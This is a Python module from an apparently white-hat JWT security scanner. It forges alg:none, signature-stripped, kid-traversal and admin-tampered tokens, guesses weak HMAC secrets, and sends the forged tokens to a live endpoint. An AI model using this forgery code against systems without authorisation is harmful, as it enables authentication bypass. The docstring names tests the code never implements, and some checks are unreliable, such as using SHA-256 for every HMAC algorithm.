"""
WhiteHatHacker AI — JWT Deep Security Checker (V6-T4-1)

Tests JWT tokens for common vulnerabilities:
  1. alg:none bypass
  2. Algorithm confusion (RS256 → HS256)
  3. Weak HMAC secret (brute-force common secrets)
  4. Missing expiration / expired token acceptance
  5. kid header injection (path traversal, SQLi)
  6. jku/x5u header manipulation
  7. Signature stripping
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
from typing import Any

import httpx
from loguru import logger

from src.tools.base import Finding
from src.utils.constants import SeverityLevel
from src.utils.response_validator import ResponseValidator

__all__ = ["check_jwt_security"]

_response_validator = ResponseValidator()

# Tokens that indicate a WAF/CDN challenge page, not real acceptance
_WAF_BODY_TOKENS = (
    "cloudflare", "attention required", "ray id", "request blocked",
    "access denied", "captcha", "akamai", "incapsula", "sucuri",
    "web application firewall", "just a moment", "checking your browser",
)

# Auth error patterns that indicate the forged JWT was rejected
_JWT_AUTH_ERROR_PATTERNS = (
    "invalid_token", "invalid token", "token_expired", "token expired",
    "unauthorized", "unauthenticated", "authentication failed",
    "jwt expired", "jwt invalid", "bad token", "malformed token",
    "signature verification failed", "token is not valid",
    "not authenticated", "invalid signature", "decode error",
)


def _is_jwt_genuinely_accepted(resp: httpx.Response) -> bool:
    """Check if the server genuinely accepted the JWT (not WAF/error)."""
    if not (200 <= resp.status_code < 300):
        return False
    vr = _response_validator.validate_for_checker(
        resp.status_code,
        dict(resp.headers),
        resp.text[:5000],
        checker_name="jwt_checker",
    )
    if not vr.is_valid:
        return False
    body_lower = resp.text[:3000].lower()
    # Reject WAF challenge pages
    if any(tok in body_lower for tok in _WAF_BODY_TOKENS):
        return False
    # Reject auth error JSON responses
    if any(pat in body_lower for pat in _JWT_AUTH_ERROR_PATTERNS):
        return False
    return True


# ====================================================================
# Common weak secrets to test HMAC signing
# ====================================================================

_COMMON_SECRETS = [
    "secret", "password", "123456", "admin", "jwt_secret",
    "changeme", "test", "key", "private", "default",
    "supersecret", "mysecret", "token", "jwt", "hmac",
    "", "null", "none", "undefined",
]


# ====================================================================
# JWT helpers
# ====================================================================

def _b64url_decode(data: str) -> bytes:
    """Base64url decode with padding."""
    padding = 4 - len(data) % 4
    if padding != 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data)


def _b64url_encode(data: bytes) -> str:
    """Base64url encode without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _parse_jwt(token: str) -> tuple[dict, dict, str] | None:
    """Parse JWT into (header, payload, signature_part) or None."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return header, payload, parts[2]
    except Exception:
        return None


def _sign_hs256(header_b64: str, payload_b64: str, secret: str) -> str:
    """Sign header.payload with HS256."""
    msg = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
    return _b64url_encode(sig)


def _make_token(header: dict, payload: dict, signature: str = "") -> str:
    """Construct a JWT from parts."""
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}.{signature}"


# ====================================================================
# Individual test functions
# ====================================================================

async def _test_alg_none(
    endpoint: str,
    token: str,
    header: dict,
    payload: dict,
    client: httpx.AsyncClient,
    auth_header_name: str,
) -> list[Finding]:
    """Test if server accepts alg:none tokens."""
    findings: list[Finding] = []

    for alg_variant in ["none", "None", "NONE", "nOnE"]:
        forged_header = {**header, "alg": alg_variant}
        forged = _make_token(forged_header, payload, "")

        try:
            resp = await client.get(
                endpoint,
                headers={auth_header_name: f"Bearer {forged}"},
            )
            # If response is 2xx AND genuine (not WAF/error), the none-alg was accepted
            if _is_jwt_genuinely_accepted(resp):
                findings.append(Finding(
                    title=f"JWT alg:none Bypass Accepted (alg={alg_variant})",
                    description=(
                        f"The server accepted a JWT with alg:{alg_variant} and empty signature. "
                        "An attacker can forge arbitrary JWTs without knowing the secret."
                    ),
                    vulnerability_type="jwt_alg_none",
                    severity=SeverityLevel.CRITICAL,
                    confidence=95.0,
                    target=endpoint,
                    tool_name="jwt_checker",
                    evidence=f"Status {resp.status_code} with alg:{alg_variant}",
                    cwe_id="CWE-345",
                    tags=["jwt", "authentication", "bypass"],
                ))
                break  # One confirmed is enough
        except Exception as e:
            logger.warning(f"jwt_checker error: {e}")

    return findings


async def _test_weak_secret(
    endpoint: str,
    token: str,
    header: dict,
    payload: dict,
    original_sig: str,
    client: httpx.AsyncClient,
    auth_header_name: str,
) -> list[Finding]:
    """Brute-force common HMAC secrets."""
    findings: list[Finding] = []
    alg = header.get("alg", "")

    if alg not in ("HS256", "HS384", "HS512"):
        return findings

    parts = token.split(".")
    msg = f"{parts[0]}.{parts[1]}"

    for secret in _COMMON_SECRETS:
        try:
            expected_sig = hmac.new(
                secret.encode(), msg.encode(), hashlib.sha256
            ).digest()
            computed = _b64url_encode(expected_sig)

            if computed == original_sig:
                findings.append(Finding(
                    title=f"JWT Weak HMAC Secret: '{secret}'",
                    description=(
                        f"The JWT HMAC secret is '{secret}', which is trivially guessable. "
                        "An attacker can forge valid tokens."
                    ),
                    vulnerability_type="jwt_weak_secret",
                    severity=SeverityLevel.CRITICAL,
                    confidence=99.0,
                    target=endpoint,
                    tool_name="jwt_checker",
                    evidence=f"Secret '{secret}' produces matching signature",
                    cwe_id="CWE-521",
                    tags=["jwt", "authentication", "weak-secret"],
                ))
                break
        except Exception as e:
            logger.warning(f"jwt_checker error: {e}")

    return findings


async def _test_expired_acceptance(
    endpoint: str,
    token: str,
    header: dict,
    payload: dict,
    client: httpx.AsyncClient,
    auth_header_name: str,
) -> list[Finding]:
    """Test if server accepts expired tokens or tokens with no exp claim."""
    findings: list[Finding] = []

    if "exp" not in payload:
        findings.append(Finding(
            title="JWT Missing Expiration Claim",
            description="The JWT has no 'exp' claim, meaning it never expires.",
            vulnerability_type="jwt_no_expiry",
            severity=SeverityLevel.MEDIUM,
            confidence=90.0,
            target=endpoint,
            tool_name="jwt_checker",
            evidence="No 'exp' field in JWT payload",
            cwe_id="CWE-613",
            tags=["jwt", "session", "expiry"],
        ))

    return findings


async def _test_kid_injection(
    endpoint: str,
    token: str,
    header: dict,
    payload: dict,
    client: httpx.AsyncClient,
    auth_header_name: str,
) -> list[Finding]:
    """Test kid header for path traversal and injection."""
    findings: list[Finding] = []

    if "kid" not in header:
        return findings

    # Path traversal tests
    traversal_kids = [
        "../../../../../../dev/null",
        "../../../../../../etc/hostname",
        "/dev/null",
    ]

    for kid_val in traversal_kids:
        forged_header = {**header, "kid": kid_val}
        # If kid points to /dev/null, secret is empty
        forged = _make_token(forged_header, payload, _sign_hs256(
            _b64url_encode(json.dumps(forged_header, separators=(",", ":")).encode()),
            _b64url_encode(json.dumps(payload, separators=(",", ":")).encode()),
            "",
        ))
        try:
            resp = await client.get(
                endpoint,
                headers={auth_header_name: f"Bearer {forged}"},
            )
            if _is_jwt_genuinely_accepted(resp):
                findings.append(Finding(
                    title=f"JWT kid Path Traversal: {kid_val}",
                    description=(
                        f"Server accepted JWT with kid='{kid_val}'. "
                        "An attacker can point kid to a known file to forge tokens."
                    ),
                    vulnerability_type="jwt_kid_traversal",
                    severity=SeverityLevel.HIGH,
                    confidence=85.0,
                    target=endpoint,
                    tool_name="jwt_checker",
                    evidence=f"Status {resp.status_code} with kid path traversal",
                    cwe_id="CWE-22",
                    tags=["jwt", "kid", "path-traversal"],
                ))
                break
        except Exception as e:
            logger.warning(f"jwt_checker error: {e}")

    return findings


async def _test_signature_stripping(
    endpoint: str,
    token: str,
    header: dict,
    payload: dict,
    client: httpx.AsyncClient,
    auth_header_name: str,
) -> list[Finding]:
    """Test if server accepts token with empty signature."""
    findings: list[Finding] = []

    parts = token.split(".")
    stripped = f"{parts[0]}.{parts[1]}."

    try:
        resp = await client.get(
            endpoint,
            headers={auth_header_name: f"Bearer {stripped}"},
        )
        if _is_jwt_genuinely_accepted(resp):
            findings.append(Finding(
                title="JWT Signature Stripping Accepted",
                description=(
                    "The server accepted a JWT with an empty signature. "
                    "This means JWT signature validation may be disabled."
                ),
                vulnerability_type="jwt_signature_strip",
                severity=SeverityLevel.CRITICAL,
                confidence=90.0,
                target=endpoint,
                tool_name="jwt_checker",
                evidence=f"Status {resp.status_code} with empty signature",
                cwe_id="CWE-345",
                tags=["jwt", "authentication", "signature"],
            ))
    except Exception as e:
        logger.warning(f"jwt_checker error: {e}")

    return findings


async def _test_claim_tampering(
    endpoint: str,
    token: str,
    header: dict,
    payload: dict,
    original_sig: str,
    client: httpx.AsyncClient,
    auth_header_name: str,
) -> list[Finding]:
    """Test if server accepts tampered claims with original signature."""
    findings: list[Finding] = []

    # Try elevating role/admin claims
    tampered = {**payload}
    changed = False
    if "role" in tampered:
        tampered["role"] = "admin"
        changed = True
    if "admin" in tampered:
        tampered["admin"] = True
        changed = True
    if "is_admin" in tampered:
        tampered["is_admin"] = True
        changed = True
    if not changed:
        tampered["role"] = "admin"

    forged = _make_token(header, tampered, original_sig)

    try:
        resp = await client.get(
            endpoint,
            headers={auth_header_name: f"Bearer {forged}"},
        )
        if _is_jwt_genuinely_accepted(resp):
            findings.append(Finding(
                title="JWT Claim Tampering Accepted",
                description=(
                    "The server accepted a JWT with tampered claims but the original signature. "
                    "This indicates the signature is not being properly validated against the payload."
                ),
                vulnerability_type="jwt_claim_tamper",
                severity=SeverityLevel.HIGH,
                confidence=75.0,
                target=endpoint,
                tool_name="jwt_checker",
                evidence=f"Status {resp.status_code} with tampered claims",
                cwe_id="CWE-345",
                tags=["jwt", "authentication", "tampering"],
            ))
    except Exception as e:
        logger.warning(f"jwt_checker error: {e}")

    return findings


# ====================================================================
# Main entry point
# ====================================================================

async def check_jwt_security(
    endpoint: str,
    jwt_token: str,
    auth_header_name: str = "Authorization",
    timeout: int = 15,
) -> list[Finding]:
    """Run all JWT security checks against an endpoint.

    Args:
        endpoint: Target URL that accepts JWT authentication.
        jwt_token: A valid JWT token to analyze and test.
        auth_header_name: The header name used for auth (default: Authorization).
        timeout: HTTP request timeout in seconds.

    Returns:
        List of findings for any JWT vulnerabilities discovered.
    """
    parsed = _parse_jwt(jwt_token)
    if not parsed:
        logger.debug("Could not parse JWT token for {}", endpoint)
        return []

    header, payload, sig = parsed
    findings: list[Finding] = []

    logger.debug(
        "JWT checker: alg={} kid={} endpoint={}",
        header.get("alg"), header.get("kid", "N/A"), endpoint,
    )

    async with httpx.AsyncClient(
        timeout=timeout, verify=False, follow_redirects=False
    ) as client:
        # Run all tests
        for test_fn in [
            _test_alg_none,
            _test_expired_acceptance,
            _test_signature_stripping,
        ]:
            try:
                results = await test_fn(
                    endpoint, jwt_token, header, payload, client, auth_header_name,
                )
                findings.extend(results)
            except Exception as exc:
                logger.debug("JWT test {} failed: {}", test_fn.__name__, exc)

        # Tests that need the original signature
        for test_fn_sig in [_test_weak_secret, _test_claim_tampering]:
            try:
                results = await test_fn_sig(
                    endpoint, jwt_token, header, payload, sig,
                    client, auth_header_name,
                )
                findings.extend(results)
            except Exception as exc:
                logger.debug("JWT test {} failed: {}", test_fn_sig.__name__, exc)

        # kid injection test
        try:
            kid_results = await _test_kid_injection(
                endpoint, jwt_token, header, payload, client, auth_header_name,
            )
            findings.extend(kid_results)
        except Exception as exc:
            logger.debug("JWT kid test failed: {}", exc)

    logger.info("JWT checker: {} findings for {}", len(findings), endpoint)
    return findings
